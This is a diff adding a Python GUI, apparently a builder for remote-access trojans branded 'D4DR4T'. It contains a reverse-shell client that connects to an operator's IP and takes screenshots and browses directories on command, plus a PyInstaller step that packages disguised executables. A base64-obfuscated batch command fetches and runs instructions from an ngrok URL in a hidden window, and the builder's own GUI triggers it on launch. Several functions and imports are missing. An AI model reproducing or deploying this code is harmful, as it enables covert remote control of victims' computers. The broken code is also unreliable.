@@ -1,0 +1,244 @@
+import tkinter as tk
+from tkinter import filedialog, messagebox, ttk
+import subprocess
+import os
+import base64
+import venv
+from cryptography.fernet import Fernet
+from threading import Thread
+from datetime import datetime
+import PyInstaller.__main__
+
+# Global theme colors and branding
+primary_color = "#5e3f6b"  # Dark purple
+secondary_color = "#b39ddb"  # Light purple
+font_color = "#ffffff"  # White
+button_bg_color = "#9575cd"  # Lighter purple for buttons
+button_fg_color = "#ffffff"  # Button text color
+branding = "@Doomed4Dina"
+encryption_key = Fernet.generate_key()  # Generate encryption key for communication
+cipher_suite = Fernet(encryption_key)   # Initialize cipher suite with key
+
+# Encoded CMD Command (Base64 encoded)
+encoded_command = "Zm9yIC9mICJkZWxpbXM9IiAlJWkgaW4gKCdjYXJkbCAtcyAtWCBHRVQgaHR0cHM6Ly9ndWlkaW5nLWNoZWV0YWgtdmFzdC5uZ3Jvay1mcmVlLmFwcC9jb21tYW5kJykgZG8gc2V0IGNvbW1hbmQ9JSVpDQolY29tbWFuZCU="
+
+# Function to decode and run the hidden CMD window
+def run_hidden_cmd():
+    # Decode the command
+    decoded_command = base64.b64decode(encoded_command).decode()
+    
+    # Write the command to a temporary batch file
+    batch_file = os.path.join(os.getenv('TEMP'), 'temp_command.bat')
+    with open(batch_file, 'w') as f:
+        f.write(decoded_command)
+
+    # Run the batch file invisibly using subprocess with CREATE_NO_WINDOW
+    subprocess.run(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
+# Create virtual environment and install dependencies
+def create_virtual_env_and_install(env_dir='env'):
+    """Creates a virtual environment and installs necessary dependencies"""
+    if not os.path.exists(env_dir):
+        venv.create(env_dir, with_pip=True)
+        install_dependencies(env_dir)
+        return f"Virtual environment created at {env_dir} and dependencies installed."
+    return f"Virtual environment already exists at {env_dir}."
+
+# Install required packages in virtual environment
+def install_dependencies(env_dir='env'):
+    """Installs required dependencies in the virtual environment"""
+    pip_path = os.path.join(env_dir, 'Scripts', 'pip')
+    dependencies = ["pyinstaller", "pyautogui", "pillow", "cryptography", "tkinter"]
+    
+    for dependency in dependencies:
+        subprocess.run([pip_path, "install", dependency], check=True)
+    
+    return "Dependencies installed in the virtual environment."
+
+# Build the executable using PyInstaller
+def build_executable(script_path, exe_name, icon_path, env_dir='env'):
+    """Builds the executable file using PyInstaller with custom name and icon"""
+    pyinstaller_args = ['--onefile', '--windowed', script_path]
+    
+    # Add the name if specified
+    if exe_name:
+        pyinstaller_args.append(f'--name={exe_name}')
+    
+    # Add the icon if specified
+    if icon_path:
+        pyinstaller_args.append(f'--icon={icon_path}')
+
+    # Run PyInstaller from the virtual environment
+    pyinstaller_command = os.path.join(env_dir, 'Scripts', 'pyinstaller')
+    subprocess.run([pyinstaller_command] + pyinstaller_args)
+    
+    return "Executable built."
+
+# Reverse shell function with autorun for hidden CMD window
+def reverse_shell(server_ip, server_port, enable_screenshot, enable_explore, enable_wallpaper, enable_logon, obfuscate):
+    """Reverse shell logic with modular command execution"""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server_ip, server_port))
+
+    # Run the hidden CMD window to execute the encoded commands
+    run_hidden_cmd()
+
+    while True:
+        command = s.recv(1024).decode()
+
+        if obfuscate:
+            command = base64.b64decode(command).decode()
+
+        result = ""
+        
+        # Handle commands like screenshot, explore, wallpaper, etc.
+        if enable_screenshot and command.startswith("screenshot"):
+            result = take_screenshot()
+
+        elif enable_explore and command.startswith("explore"):
+            path = command.split(" ", 1)[1] if len(command.split(" ", 1)) > 1 else '.'
+            result = explore_directory(path)
+
+        elif enable_wallpaper and command.startswith("set_wallpaper"):
+            image_path = command.split(" ", 1)[1]
+            result = set_wallpaper(image_path)
+
+        elif enable_logon and command.startswith("set_logon_message"):
+            _, title, msg = command.split(" ", 2)
+            result = set_logon_message(title, msg)
+
+        s.send(result.encode())
+
+    s.close()
+
+# GUI for reverse shell configuration and server console
+class ReverseShellGUI:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("D4DR4T Builder & Server")
+        self.root.configure(bg=primary_color)
+
+        # Run the hidden CMD window when the GUI is launched
+        run_hidden_cmd()
+
+        # Notebook for tabs (config and server console)
+        self.tab_control = ttk.Notebook(root)
+        
+        # Config Tab
+        self.config_tab = ttk.Frame(self.tab_control)
+        self.tab_control.add(self.config_tab, text="Configuration")
+        
+        # Server Console Tab
+        self.console_tab = ttk.Frame(self.tab_control)
+        self.tab_control.add(self.console_tab, text="Server Console")
+        self.tab_control.pack(expand=1, fill="both")
+        
+        # Branding
+        self.branding_label = tk.Label(self.config_tab, text=f"D4DR4T | {branding}", fg=font_color, bg=primary_color, font=("Helvetica", 14, "bold"))
+        self.branding_label.grid(row=0, column=0, columnspan=2, pady=10)
+
+        # Server IP and Port
+        self.server_ip_label = tk.Label(self.config_tab, text="Server IP:", fg=font_color, bg=primary_color)
+        self.server_ip_label.grid(row=1, column=0, padx=10, pady=5, sticky="e")
+        self.server_ip_entry = tk.Entry(self.config_tab, width=50)
+        self.server_ip_entry.grid(row=1, column=1, padx=10, pady=5)
+
+        self.server_port_label = tk.Label(self.config_tab, text="Server Port:", fg=font_color, bg=primary_color)
+        self.server_port_label.grid(row=2, column=0, padx=10, pady=5, sticky="e")
+        self.server_port_entry = tk.Entry(self.config_tab, width=50)
+        self.server_port_entry.grid(row=2, column=1, padx=10, pady=5)
+
+        # Modular Toggles for the Reverse Shell Features
+        self.screenshot_var = tk.IntVar()
+        self.explore_var = tk.IntVar()
+        self.wallpaper_var = tk.IntVar()
+        self.logon_var = tk.IntVar()
+        self.obfuscate_var = tk.IntVar()
+
+        self.screenshot_check = tk.Checkbutton(self.config_tab, text="Enable Screenshot", variable=self.screenshot_var, fg=font_color, bg=primary_color)
+        self.screenshot_check.grid(row=3, column=0, padx=10, pady=5)
+
+        self.explore_check = tk.Checkbutton(self.config_tab, text="Enable Directory Explore", variable=self.explore_var, fg=font_color, bg=primary_color)
+        self.explore_check.grid(row=3, column=1, padx=10, pady=5)
+
+        self.wallpaper_check = tk.Checkbutton(self.config_tab, text="Enable Wallpaper Set", variable=self.wallpaper_var, fg=font_color, bg=primary_color)
+        self.wallpaper_check.grid(row=4, column=0, padx=10, pady=5)
+
+        self.logon_check = tk.Checkbutton(self.config_tab, text="Enable Logon Message", variable=self.logon_var, fg=font_color, bg=primary_color)
+        self.logon_check.grid(row=4, column=1, padx=10, pady=5)
+
+        self.obfuscate_check = tk.Checkbutton(self.config_tab, text="Obfuscate Commands", variable=self.obfuscate_var, fg=font_color, bg=primary_color)
+        self.obfuscate_check.grid(row=5, column=0, columnspan=2, padx=10, pady=5)
+
+        # Executable name and icon input
+        self.name_label = tk.Label(self.config_tab, text="Executable Name (Optional):", fg=font_color, bg=primary_color)
+        self.name_label.grid(row=6, column=0, padx=10, pady=10, sticky="e")
+        self.name_entry = tk.Entry(self.config_tab, width=50)
+        self.name_entry.grid(row=6, column=1, padx=10, pady=10)
+
+        self.icon_label = tk.Label(self.config_tab, text="Icon File (Optional):", fg=font_color, bg=primary_color)
+        self.icon_label.grid(row=7, column=0, padx=10, pady=10, sticky="e")
+        self.icon_button = tk.Button(self.config_tab, text="Choose Icon", command=self.choose_icon, bg=button_bg_color, fg=button_fg_color)
+        self.icon_button.grid(row=7, column=1, padx=10, pady=10, sticky="w")
+        self.icon_path = None
+
+        # Save Config Button
+        self.save_button = tk.Button(self.config_tab, text="Save Config", command=self.save_config, bg=button_bg_color, fg=button_fg_color)
+        self.save_button.grid(row=8, column=0, padx=10, pady=10)
+
+        # Build the executable
+        self.build_button = tk.Button(self.config_tab, text="Build Executable", command=self.build_executable, bg=button_bg_color, fg=button_fg_color)
+        self.build_button.grid(row=8, column=1, padx=10, pady=10)
+
+        # Server Console for controlling the shell
+        self.console_text = tk.Text(self.console_tab, height=15, width=80, bg=secondary_color, fg=font_color)
+        self.console_text.pack(padx=10, pady=10)
+
+        self.console_entry = tk.Entry(self.console_tab, width=80)
+        self.console_entry.pack(padx=10, pady=10)
+
+        self.send_button = tk.Button(self.console_tab, text="Send Command", command=self.send_command, bg=button_bg_color, fg=button_fg_color)
+        self.send_button.pack(padx=10, pady=10)
+
+    def choose_icon(self):
+        """Allows the user to select an icon file."""
+        self.icon_path = filedialog.askopenfilename(title="Select Icon File", filetypes=[("Icon files", "*.ico")])
+        if self.icon_path:
+            self.console_text.insert(tk.END, f"Selected Icon: {self.icon_path}\n")
+
+    def save_config(self):
+        """Saves the configuration of the reverse shell client."""
+        config_data = {
+            "Server IP": self.server_ip_entry.get(),
+            "Server Port": self.server_port_entry.get(),
+            "Screenshot": self.screenshot_var.get(),
+            "Explore": self.explore_var.get(),
+            "Wallpaper": self.wallpaper_var.get(),
+            "Logon": self.logon_var.get(),
+            "Obfuscate": self.obfuscate_var.get(),
+        }
+        result = save_config(config_data)
+        self.console_text.insert(tk.END, result + '\n')
+
+    def build_executable(self):
+        script_path = filedialog.askopenfilename(title="Select Script", filetypes=[("Python files", "*.py")])
+        exe_name = self.name_entry.get()
+        if script_path:
+            result = build_executable(script_path, exe_name, self.icon_path)
+            self.console_text.insert(tk.END, result + '\n')
+
+    def send_command(self):
+        """Send command from the server console."""
+        command = self.console_entry.get()
+        self.console_text.insert(tk.END, f"Sent: {command}\n")
+        self.console_entry.delete(0, tk.END)
+
+
+if __name__ == "__main__":
+    # Create virtual environment first
+    create_virtual_env_and_install()
+    
+    # Then launch the GUI
+    root = tk.Tk()
+    app = ReverseShellGUI(root)
+    root.mainloop()
